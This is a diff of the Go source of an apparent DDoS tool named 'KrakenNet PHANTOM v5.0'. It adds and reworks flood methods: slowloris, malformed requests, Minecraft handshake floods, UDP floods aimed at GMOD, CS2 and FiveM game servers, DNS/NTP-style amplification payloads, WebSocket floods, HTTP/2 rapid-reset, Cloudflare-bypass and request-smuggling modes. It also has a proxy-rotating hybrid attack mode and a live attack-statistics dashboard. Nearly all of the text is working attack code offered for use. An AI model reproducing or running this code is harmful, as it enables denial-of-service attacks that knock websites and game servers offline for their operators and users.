+	alive := true
+	for alive {
 		select {
 		case <-stop:
 			conn.Close()
 			return true
 		case <-ticker.C:
-			_, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(10))
+			_, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(20))
 			if err != nil {
-				conn.Close()
-				return false
+				alive = false
+				break
 			}
 			atomic.AddInt64(&totalSuccess, 1)
-			trackMethod("slowloris")
 		}
 	}
+	conn.Close()
+	return false
 }
 
 func malformedOnce(targetURL string) error {
@@ -1557,19 +1309,21 @@ func malformedOnce(targetURL string) error {
 		conn = tlsConn
 	}
 	longURL := "/" + randString(8192+rand.Intn(8192))
-	payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", longURL, host, randomUserAgent())
+	payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n",
+		longURL, host, randomUserAgent())
 	conn.Write([]byte(payload))
 	conn.Close()
 	atomic.AddInt64(&totalReq, 1)
 	atomic.AddInt64(&totalSuccess, 1)
 	atomic.AddInt64(&totalBytes, int64(len(payload)))
-	trackMethod("malformed")
 	return nil
 }
 
-// ─────────────────────────────────────────────
-//  ── UDP / GAME WORKERS ──
-// ─────────────────────────────────────────────
+func generatePayload(size int) []byte {
+	payload := make([]byte, size)
+	rand.Read(payload)
+	return payload
+}
 
 func writeVarInt(buf *bytes.Buffer, value int32) {
 	for {
@@ -1592,29 +1346,94 @@ func minecraftWorker(ctx context.Context, host string, mcPort int) {
 		case <-ctx.Done():
 			return
 		default:
-			conn, err := net.Dial("tcp", addr)
+			conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
 			if err != nil {
 				continue
 			}
-			buf := new(bytes.Buffer)
-			writeVarInt(buf, 764) // 1.20.2 protocol
-			writeVarInt(buf, int32(len(host)))
-			buf.WriteString(host)
-			binary.Write(buf, binary.BigEndian, uint16(mcPort))
-			writeVarInt(buf, 1)
-			handshake := new(bytes.Buffer)
-			writeVarInt(handshake, int32(buf.Len()+1))
-			handshake.WriteByte(0x00)
-			handshake.Write(buf.Bytes())
-			conn.Write(handshake.Bytes())
-			statusReq := new(bytes.Buffer)
-			writeVarInt(statusReq, 1)
-			statusReq.WriteByte(0x00)
-			conn.Write(statusReq.Bytes())
+			for _, proto := range []int32{754, 759, 760, 762, 763, 765} {
+				buf := new(bytes.Buffer)
+				writeVarInt(buf, proto)
+				writeVarInt(buf, int32(len(host)))
+				buf.WriteString(host)
+				binary.Write(buf, binary.BigEndian, uint16(mcPort))
+				writeVarInt(buf, 1)
+				handshakePacket := new(bytes.Buffer)
+				writeVarInt(handshakePacket, int32(buf.Len()+1))
+				handshakePacket.WriteByte(0x00)
+				handshakePacket.Write(buf.Bytes())
+				conn.Write(handshakePacket.Bytes())
+			}
+			statusBuf := new(bytes.Buffer)
+			writeVarInt(statusBuf, 1)
+			statusBuf.WriteByte(0x00)
+			conn.Write(statusBuf.Bytes())
 			io.Copy(io.Discard, conn)
 			conn.Close()
 			atomic.AddInt64(&totalSuccess, 1)
-			trackMethod("minecraft")
+		}
+	}
+}
+
+type GMODWorker struct {
+	Target string
+	Port   int
+}
+
+func (gw *GMODWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
+	defer wg.Done()
+	addr := fmt.Sprintf("%s:%d", gw.Target, gw.Port)
+	conn, err := net.Dial("udp", addr)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+	payloads := [][]byte{
+		[]byte("\xff\xff\xff\xff\x54Source Engine Query\x00"),
+		[]byte("\xff\xff\xff\xff\x56\x00\x00\x00\x00"),
+		[]byte("\xff\xff\xff\xff\x55\xff\xff\xff\xff"),
+	}
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			p := payloads[rand.Intn(len(payloads))]
+			if _, err := conn.Write(p); err == nil {
+				atomic.AddInt64(&totalSuccess, 1)
+				atomic.AddInt64(&totalBytes, int64(len(p)))
+			} else {
+				atomic.AddInt64(&totalFail, 1)
+			}
+		}
+	}
+}
+
+type CS2Worker struct {
+	Target string
+	Port   int
+}
+
+func (cw *CS2Worker) Start(ctx context.Context, wg *sync.WaitGroup) {
+	defer wg.Done()
+	addr := fmt.Sprintf("%s:%d", cw.Target, cw.Port)
+	conn, err := net.Dial("udp", addr)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+	a2sInfo := []byte("\xff\xff\xff\xffTSource Engine Query\x00")
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			if _, err := conn.Write(a2sInfo); err == nil {
+				atomic.AddInt64(&totalSuccess, 1)
+				atomic.AddInt64(&totalBytes, int64(len(a2sInfo)))
+			} else {
+				atomic.AddInt64(&totalFail, 1)
+			}
+			time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
 		}
 	}
 }
@@ -1633,17 +1452,21 @@ func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 		return
 	}
 	defer conn.Close()
-	payload := []byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00")
+	payloads := [][]byte{
+		[]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"),
+		[]byte("\xff\xff\xff\xffgetchallenge\x00\x00\x00"),
+		[]byte("\xff\xff\xff\xffgetstatus\x00\x00\x00"),
+	}
 	for {
 		select {
 		case <-ctx.Done():
 			return
 		default:
+			p := payloads[rand.Intn(len(payloads))]
 			for i := 0; i < fw.Burst; i++ {
-				if _, err := conn.Write(payload); err == nil {
+				if _, err := conn.Write(p); err == nil {
 					atomic.AddInt64(&totalSuccess, 1)
-					atomic.AddInt64(&totalBytes, int64(len(payload)))
-					trackMethod("fivem")
+					atomic.AddInt64(&totalBytes, int64(len(p)))
 				} else {
 					atomic.AddInt64(&totalFail, 1)
 				}
@@ -1652,7 +1475,10 @@ func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	}
 }
 
-type UDPDiscordWorker struct{ Target string; Port int }
+type UDPDiscordWorker struct {
+	Target string
+	Port   int
+}
 
 func (uw *UDPDiscordWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
@@ -1671,7 +1497,6 @@ func (uw *UDPDiscordWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 			if _, err := conn.Write(payload); err == nil {
 				atomic.AddInt64(&totalSuccess, 1)
 				atomic.AddInt64(&totalBytes, int64(len(payload)))
-				trackMethod("udp-discord")
 			} else {
 				atomic.AddInt64(&totalFail, 1)
 			}
@@ -1679,7 +1504,10 @@ func (uw *UDPDiscordWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	}
 }
 
-type UDPBypassWorker struct{ Target string; Port int }
+type UDPBypassWorker struct {
+	Target string
+	Port   int
+}
 
 func (uw *UDPBypassWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
@@ -1696,16 +1524,17 @@ func (uw *UDPBypassWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 		default:
 			size := rand.Intn(1200) + 50
 			payload := generatePayload(size)
-			if rand.Intn(3) == 0 {
-				payload[0] = 0xFF
-				payload[1] = 0xFF
-				payload[2] = 0xFF
-				payload[3] = 0xFF
+			switch rand.Intn(4) {
+			case 0:
+				payload[0] = 0xFF; payload[1] = 0xFF; payload[2] = 0xFF; payload[3] = 0xFF
+			case 1:
+				copy(payload, []byte("\x00\x00\x00\x00"))
+			case 2:
+				copy(payload, []byte("TE\x00\x00"))
 			}
 			if _, err := conn.Write(payload); err == nil {
 				atomic.AddInt64(&totalSuccess, 1)
 				atomic.AddInt64(&totalBytes, int64(size))
-				trackMethod("udp-bypass")
 			} else {
 				atomic.AddInt64(&totalFail, 1)
 			}
@@ -1713,7 +1542,11 @@ func (uw *UDPBypassWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	}
 }
 
-type UDPGbpsWorker struct{ Target string; Port, Size int }
+type UDPGbpsWorker struct {
+	Target string
+	Port   int
+	Size   int
+}
 
 func (uw *UDPGbpsWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
@@ -1732,7 +1565,6 @@ func (uw *UDPGbpsWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 			if _, err := conn.Write(payload); err == nil {
 				atomic.AddInt64(&totalSuccess, 1)
 				atomic.AddInt64(&totalBytes, int64(uw.Size))
-				trackMethod("udp-gbps")
 			} else {
 				atomic.AddInt64(&totalFail, 1)
 			}
@@ -1740,7 +1572,43 @@ func (uw *UDPGbpsWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	}
 }
 
-type WsFloodWorker struct{ Target string }
+type UDPAmpWorker struct {
+	Target string
+	Port   int
+}
+
+func (uw *UDPAmpWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
+	defer wg.Done()
+	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
+	conn, err := net.Dial("udp", addr)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+	payloads := [][]byte{
+		[]byte("\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x01"),
+		[]byte("\x00\x2b\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04pool\x03ntp\x03org\x00\x00\x01\x00\x01"),
+		[]byte("\x26\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
+	}
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			p := payloads[rand.Intn(len(payloads))]
+			if _, err := conn.Write(p); err == nil {
+				atomic.AddInt64(&totalSuccess, 1)
+				atomic.AddInt64(&totalBytes, int64(len(p)))
+			} else {
+				atomic.AddInt64(&totalFail, 1)
+			}
+		}
+	}
+}
+
+type WsFloodWorker struct {
+	Target string
+}
 
 func (ww *WsFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
@@ -1768,6 +1636,7 @@ func (ww *WsFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 	headers := http.Header{}
 	headers.Set("User-Agent", randomUserAgent())
 	headers.Set("Origin", ww.Target)
+	headers.Set("Accept-Language", randomAcceptLanguage())
 	for {
 		select {
 		case <-ctx.Done():
@@ -1801,33 +1670,25 @@ func (ww *WsFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 				msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`, randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
 				werr = conn.WriteMessage(websocket.TextMessage, []byte(msg))
 			case 1:
-				data := make([]byte, 4096+rand.Intn(12288))
+				data := make([]byte, 1024+rand.Intn(7168))
 				rand.Read(data)
 				werr = conn.WriteMessage(websocket.BinaryMessage, data)
 			case 2:
 				werr = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
 			case 3:
-				werr = conn.WriteMessage(websocket.TextMessage, []byte(randString(16384+rand.Intn(49152))))
+				werr = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.Intn(40960))))
 			case 4:
-				for j := 0; j < 20; j++ {
-					if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(64))); e != nil {
+				for j := 0; j < 10; j++ {
+					if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
 						werr = e
 						break
 					}
 					atomic.AddInt64(&totalSuccess, 1)
-					atomic.AddInt64(&totalBytes, 64)
-					trackMethod("ws-flood")
 				}
 			case 5:
-				// Send a fragmented WS message
-				w, e := conn.NextWriter(websocket.TextMessage)
-				if e == nil {
-					for j := 0; j < 10; j++ {
-						w.Write([]byte(randString(512)))
-					}
-					w.Close()
-				}
-				werr = e
+				payload := fmt.Sprintf(`{"event":"subscribe","channels":["%s","%s","%s"]}`,
+					randString(12), randString(12), randString(12))
+				werr = conn.WriteMessage(websocket.TextMessage, []byte(payload))
 			}
 			if werr != nil {
 				atomic.AddInt64(&totalFail, 1)
@@ -1835,14 +1696,9 @@ func (ww *WsFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
 				break inner
 			}
 			atomic.AddInt64(&totalSuccess, 1)
-			trackMethod("ws-flood")
 		}
 	}
 }
-
-// ─────────────────────────────────────────────
-//  ── WORKER INFRASTRUCTURE ──
-// ─────────────────────────────────────────────
 
 type requestFunc func(client *http.Client, url string) bool
 
@@ -1870,64 +1726,115 @@ func spawnRequestWorkers(ctx context.Context, wg *sync.WaitGroup, url string, fn
 	}
 }
 
-// ─────────────────────────────────────────────
-//  ── LIVE DASHBOARD ──
-// ─────────────────────────────────────────────
+func updatePeakRPS(current float64) {
+	statsMu.Lock()
+	if current > peakRPS {
+		peakRPS = current
+	}
+	rpsHistory[rpsIdx%30] = current
+	rpsIdx++
+	statsMu.Unlock()
+}
 
-func statsReporter(ctx context.Context, mode string) {
+func avgRPS() float64 {
+	statsMu.Lock()
+	defer statsMu.Unlock()
+	var sum float64
+	count := rpsIdx
+	if count > 30 {
+		count = 30
+	}
+	for i := 0; i < count; i++ {
+		sum += rpsHistory[i]
+	}
+	if count == 0 {
+		return 0
+	}
+	return sum / float64(count)
+}
+
+func rpsBar(current, peak float64, width int) string {
+	if peak == 0 {
+		return strings.Repeat("░", width)
+	}
+	filled := int(current / peak * float64(width))
+	if filled > width {
+		filled = width
+	}
+	bar := ""
+	for i := 0; i < width; i++ {
+		if i < filled {
+			if i < width/3 {
+				bar += Green + "█" + Reset
+			} else if i < width*2/3 {
+				bar += Yellow + "█" + Reset
+			} else {
+				bar += Red + "█" + Reset
+			}
+		} else {
+			bar += Gray + "░" + Reset
+		}
+	}
+	return bar
+}
+
+func statsReporter(ctx context.Context) {
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
-	var prevReq int64
+	lastTick = time.Now()
+	lastReq = 0
 	for {
 		select {
 		case <-ctx.Done():
 			return
-		case <-ticker.C:
+		case t := <-ticker.C:
 			reqs := atomic.LoadInt64(&totalReq)
 			ok := atomic.LoadInt64(&totalSuccess)
 			fail := atomic.LoadInt64(&totalFail)
 			data := atomic.LoadInt64(&totalBytes)
-			elapsed := time.Since(attackStart)
-			secs := elapsed.Seconds()
-			if secs < 1 {
-				secs = 1
+			elapsed := t.Sub(attackStart).Seconds()
+			if elapsed < 1 {
+				elapsed = 1
 			}
-			rps := reqs - prevReq
-			prevReq = reqs
-			remaining := time.Duration(durationSec)*time.Second - elapsed
+
+			tickDur := t.Sub(lastTick).Seconds()
+			if tickDur < 0.001 {
+				tickDur = 1
+			}
+			currentRPS := float64(reqs-lastReq) / tickDur
+			updatePeakRPS(currentRPS)
+			lastReq = reqs
+			lastTick = t
+
+			remaining := float64(durationSec) - elapsed
 			if remaining < 0 {
 				remaining = 0
 			}
 
-			// Build compact dashboard line
-			bar := buildProgressBar(elapsed, time.Duration(durationSec)*time.Second, 20)
+			bar := rpsBar(currentRPS, peakRPS, 20)
+			successRate := 0.0
+			if ok+fail > 0 {
+				successRate = float64(ok) / float64(ok+fail) * 100
+			}
+
+			var goroutines int = runtime.NumGoroutine()
+
 			line := fmt.Sprintf(
-				"\r%s[%s]%s %s RPS:%s%d%s | Req:%s%d%s | OK:%s%d%s | Fail:%s%d%s | Data:%s%s%s | Left:%s%s%s",
-				BCyan, mode, Reset,
+				"\r%s│%s RPS:%s%-8.0f%s [%s] %sPeak:%-8.0f%s │%s OK:%-8d%s │%s FAIL:%-6d%s │%s %.1f%%%s │%s BW:%s/s%s │%s T-%ss%s │%s G:%d%s     ",
+				Cyan, Reset,
+				BGreen, currentRPS, Reset,
 				bar,
-				BYellow, rps, Reset,
-				BWhite, reqs, Reset,
+				BYellow, peakRPS, Reset,
 				BGreen, ok, Reset,
 				BRed, fail, Reset,
-				Cyan, formatBytes(float64(data)), Reset,
-				Yellow, formatDuration(remaining), Reset,
+				BWhite, successRate, Reset,
+				Blue, formatBytes(float64(data)/elapsed), Reset,
+				Yellow, fmt.Sprintf("%.0f", remaining), Reset,
+				Gray, goroutines, Reset,
 			)
 			fmt.Print(line)
 		}
 	}
-}
-
-func buildProgressBar(elapsed, total time.Duration, width int) string {
-	if total <= 0 {
-		return "[" + strings.Repeat("█", width) + "]"
-	}
-	pct := float64(elapsed) / float64(total)
-	if pct > 1 {
-		pct = 1
-	}
-	filled := int(pct * float64(width))
-	empty := width - filled
-	return Green + "[" + strings.Repeat("█", filled) + Gray + strings.Repeat("░", empty) + Green + "]" + Reset
 }
 
 func mparam(label, value, vcolor string) {
@@ -1936,7 +1843,7 @@ func mparam(label, value, vcolor string) {
 	if pad < 1 {
 		pad = 1
 	}
-	fmt.Println(Cyan+"║"+Reset+content+strings.Repeat(" ", pad)+Cyan+"║"+Reset)
+	fmt.Println(Cyan + "║" + Reset + content + strings.Repeat(" ", pad) + Cyan + "║" + Reset)
 }
 
 func fparam(label, value string) {
@@ -1945,7 +1852,7 @@ func fparam(label, value string) {
 	if pad < 1 {
 		pad = 1
 	}
-	fmt.Println(Magenta+"║"+Reset+content+strings.Repeat(" ", pad)+Magenta+"║"+Reset)
+	fmt.Println(Magenta + "║" + Reset + content + strings.Repeat(" ", pad) + Magenta + "║" + Reset)
 }
 
 func printFinalStats(mode string) {
@@ -1958,89 +1865,126 @@ func printFinalStats(mode string) {
 	fail := atomic.LoadInt64(&totalFail)
 	data := atomic.LoadInt64(&totalBytes)
 
-	fmt.Println()
+	successRate := 0.0
+	if ok+fail > 0 {
+		successRate = float64(ok) / float64(ok+fail) * 100
+	}
+
 	fmt.Println()
 	fmt.Println(Magenta + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
-	fmt.Println(Magenta+"║"+Reset+"  "+BMagenta+"FINAL STATISTICS"+Reset+strings.Repeat(" ", 38)+Magenta+"║"+Reset)
+	fmt.Println(Magenta + "║" + Reset + "  " + Magenta + "FINAL STATISTICS — PHANTOM v5.0" + Reset + strings.Repeat(" ", 23) + Magenta + "║" + Reset)
 	fmt.Println(Magenta + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
 	fparam("Method", mode)
 	fparam("Duration", fmt.Sprintf("%.0f seconds", elapsed))
-	fparam("Requests", strconv.FormatInt(reqs, 10))
+	fparam("Total Requests", strconv.FormatInt(reqs, 10))
 	fparam("Successful", strconv.FormatInt(ok, 10))
 	fparam("Failed", strconv.FormatInt(fail, 10))
+	fparam("Success Rate", fmt.Sprintf("%.2f%%", successRate))
 	fparam("Data Sent", formatBytes(float64(data)))
 	fparam("Avg RPS", fmt.Sprintf("%.2f req/s", float64(reqs)/elapsed))
-	fparam("Peak Bandwidth", fmt.Sprintf("%s/s", formatBytes(float64(data)/elapsed)))
-
-	// Per-method breakdown
-	methodMu.RLock()
-	if len(methodCounters) > 0 {
-		fmt.Println(Magenta + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
-		fmt.Println(Magenta+"║"+Reset+"  "+BCyan+"METHOD BREAKDOWN"+Reset+strings.Repeat(" ", 38)+Magenta+"║"+Reset)
-		for m, c := range methodCounters {
-			count := atomic.LoadInt64(c)
-			if count > 0 {
-				fparam("  "+m, strconv.FormatInt(count, 10)+" hits")
-			}
-		}
-	}
-	methodMu.RUnlock()
-
+	fparam("Peak RPS", fmt.Sprintf("%.2f req/s", peakRPS))
+	fparam("Bandwidth", formatBytes(float64(data)/elapsed)+"/s")
 	fmt.Println(Magenta + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
 	fmt.Println()
-	fmt.Println(BGreen + "[+] Attack completed." + Reset)
+	fmt.Println(BGreen + "[+] Attack completed — KrakenNet PHANTOM v5.0" + Reset)
 }
 
-// ─────────────────────────────────────────────
-//  ── LAUNCH WORKERS ──
-// ─────────────────────────────────────────────
+var phantomMethods = []string{
+	"kraken", "api-flood", "cf-bypass", "rapid-reset",
+	"header-flood", "mixpost", "cache-bust", "phantom-get",
+	"h2-cont", "cookie-bomb", "malformed",
+}
 
 func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName string) {
 	switch mode {
-
-	// ── Core HTTP ──
 	case "tls", "kraken":
 		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)
+
 	case "http-flood":
 		spawnRequestWorkers(ctx, wg, "http://"+hostName, sendTLSRequest)
+
 	case "https-flood":
 		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)
+
 	case "api-flood":
 		spawnRequestWorkers(ctx, wg, target, apiFloodRequest)
+
 	case "header-flood":
 		spawnRequestWorkers(ctx, wg, target, headerFloodRequest)
+
 	case "mixpost":
 		spawnRequestWorkers(ctx, wg, target, mixPostRequest)
+
 	case "cf-bypass":
 		spawnRequestWorkers(ctx, wg, target, cfBypassRequest)
+
 	case "range":
 		spawnRequestWorkers(ctx, wg, target, rangeRequest)
+
 	case "cookie-bomb":
 		spawnRequestWorkers(ctx, wg, target, cookieBombRequest)
 
-	// ── Evasion ──
 	case "cache-bust":
 		spawnRequestWorkers(ctx, wg, target, cacheBustRequest)
-	case "cache-poison":
-		spawnRequestWorkers(ctx, wg, target, cachePoisonRequest)
-	case "origin-spoof":
-		spawnRequestWorkers(ctx, wg, target, originSpoofRequest)
-	case "etag-storm":
-		spawnRequestWorkers(ctx, wg, target, etagStormRequest)
-	case "accept-flood":
-		spawnRequestWorkers(ctx, wg, target, acceptFloodRequest)
-	case "gzip-bomb":
-		spawnRequestWorkers(ctx, wg, target, gzipBombRequest)
-	case "jwt-spray":
-		spawnRequestWorkers(ctx, wg, target, jwtSprayRequest)
-	case "graphql-depth":
-		spawnRequestWorkers(ctx, wg, target, graphqlDepthRequest)
-	case "multipart-exhaust":
-		spawnRequestWorkers(ctx, wg, target, multipartExhaustRequest)
-	case "retry-after":
-		spawnRequestWorkers(ctx, wg, target, retryAfterAbuseRequest)
 
-	// ── Slow ──
+	case "phantom-get":
+		spawnRequestWorkers(ctx, wg, target, phantomGetRequest)
+
+	case "tls-exhaust":
+		_, host, p, _ := parseTarget(target)
+		for i := 0; i < workers; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				for {
+					select {
+					case <-ctx.Done():
+						return
+					default:
+						if err := tlsExhaustOnce(host, p); err != nil {
+							atomic.AddInt64(&totalFail, 1)
+						}
+					}
+				}
+			}()
+		}
+
+	case "http-smuggle":
+		for i := 0; i < workers; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				for {
+					select {
+					case <-ctx.Done():
+						return
+					default:
+						if err := httpSmuggleOnce(target); err != nil {
+							atomic.AddInt64(&totalFail, 1)
+						}
+					}
+				}
+			}()
+		}
+
+	case "idle-h2":
+		for i := 0; i < workers; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				for {
+					select {
+					case <-ctx.Done():
+						return
+					default:
+						if err := idleH2Once(target); err != nil {
+							atomic.AddInt64(&totalFail, 1)
+						}
+					}
+				}
+			}()
+		}
+
 	case "slowloris":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
@@ -2051,15 +1995,16 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 					case <-ctx.Done():
 						return
 					default:
-						if !slowlorisOnce(target, ctx.Done()) {
-							atomic.AddInt64(&totalFail, 1)
-						} else {
+						if slowlorisOnce(target, ctx.Done()) {
 							atomic.AddInt64(&totalReq, 1)
+						} else {
+							atomic.AddInt64(&totalFail, 1)
 						}
 					}
 				}
 			}()
 		}
+
 	case "rudy":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
@@ -2080,6 +2025,7 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 				}
 			}()
 		}
+
 	case "chunk-post":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
@@ -2101,7 +2047,6 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 			}()
 		}
 
-	// ── HTTP/2 ──
 	case "rapid-reset":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
@@ -2119,6 +2064,7 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 				}
 			}()
 		}
+
 	case "h2-cont":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
@@ -2136,66 +2082,14 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 				}
 			}()
 		}
-	case "h2-priority":
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						if err := h2PriorityFlood(target); err != nil {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			}()
-		}
-	case "http-pipeline":
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						if err := httpPipelineFlood(target); err != nil {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			}()
-		}
-	case "tls-fragment":
-		_, h, p, _ := parseTarget(target)
-		for i := 0; i < workers; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for {
-					select {
-					case <-ctx.Done():
-						return
-					default:
-						if err := tlsFragmentFlood(h, p); err != nil {
-							atomic.AddInt64(&totalFail, 1)
-						}
-					}
-				}
-			}()
-		}
 
-	// ── WS ──
 	case "ws-flood":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
 			w := &WsFloodWorker{Target: target}
 			go w.Start(ctx, wg)
 		}
+
 	case "malformed":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
@@ -2214,19 +2108,27 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 			}()
 		}
 
-	// ── UDP ──
 	case "udp-discord":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
 			w := &UDPDiscordWorker{Target: hostName, Port: port}
 			go w.Start(ctx, wg)
 		}
+
 	case "udp-bypass":
 		for i := 0; i < workers; i++ {
 			wg.Add(1)
 			w := &UDPBypassWorker{Target: hostName, Port: port}
 			go w.Start(ctx, wg)
 		}
+
+	case "udp-amp":
+		for i := 0; i < workers; i++ {
+			wg.Add(1)
+			w := &UDPAmpWorker{Target: hostName, Port: port}
+			go w.Start(ctx, wg)
+		}
+
 	case "udp-gbps":
 		var pktSize int
 		fmt.Print(Yellow + "Packet size (bytes, 50-1400): " + Reset)
@@ -2239,6 +2141,7 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 			w := &UDPGbpsWorker{Target: hostName, Port: port, Size: pktSize}
 			go w.Start(ctx, wg)
 		}
+
 	case "fivem":
 		var uploadMbps float64
 		fmt.Print(Yellow + "Upload in Mbps (e.g., 0.84): " + Reset)
@@ -2252,6 +2155,7 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 			w := &FivemWorker{Target: hostName, Port: port, Burst: burst}
 			go w.Start(ctx, wg)
 		}
+
 	case "minecraft":
 		for i := 0; i < connections; i++ {
 			wg.Add(1)
@@ -2261,168 +2165,237 @@ func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName strin
 			}()
 		}
 
-	// ── ULTIMATE ──
-	case "hybrid":
-		// 6 vectors: cf-bypass, api-flood, ws-flood, rapid-reset, graphql-depth, cache-bust
-		sixth := workers / 6
-		if sixth < 1 {
-			sixth = 1
+	case "gmod":
+		for i := 0; i < workers; i++ {
+			wg.Add(1)
+			w := &GMODWorker{Target: hostName, Port: port}
+			go w.Start(ctx, wg)
 		}
-		vectors := []requestFunc{cfBypassRequest, apiFloodRequest, graphqlDepthRequest, cacheBustRequest, jwtSprayRequest, originSpoofRequest}
-		for _, fn := range vectors {
-			fn := fn
-			for i := 0; i < sixth; i++ {
+
+	case "cs2":
+		for i := 0; i < workers; i++ {
+			wg.Add(1)
+			w := &CS2Worker{Target: hostName, Port: port}
+			go w.Start(ctx, wg)
+		}
+
+	case "hybrid":
+		quarter := workers / 4
+		if quarter < 1 {
+			quarter = 1
+		}
+		spawnN := func(n int, fn func()) {
+			for i := 0; i < n; i++ {
 				wg.Add(1)
 				go func() {
 					defer wg.Done()
-					client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
-					for {
-						select {
-						case <-ctx.Done():
-							return
-						default:
-							for j := 0; j < connections; j++ {
-								if fn(client, target) {
-									atomic.AddInt64(&totalSuccess, 1)
-								} else {
-									atomic.AddInt64(&totalFail, 1)
-								}
-							}
-						}
-					}
+					fn()
 				}()
 			}
 		}
-		for i := 0; i < sixth; i++ {
+		spawnN(quarter, func() {
+			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+					for j := 0; j < connections; j++ {
+						if cfBypassRequest(client, target) {
+							atomic.AddInt64(&totalSuccess, 1)
+						} else {
+							atomic.AddInt64(&totalFail, 1)
+						}
+					}
+				}
+			}
+		})
+		spawnN(quarter, func() {
+			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+					for j := 0; j < connections; j++ {
+						if apiFloodRequest(client, target) {
+							atomic.AddInt64(&totalSuccess, 1)
+						} else {
+							atomic.AddInt64(&totalFail, 1)
+						}
+					}
+				}
+			}
+		})
+		for i := 0; i < quarter; i++ {
 			wg.Add(1)
 			w := &WsFloodWorker{Target: target}
 			go w.Start(ctx, wg)
 		}
-		for i := 0; i < sixth; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
+		spawnN(quarter, func() {
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
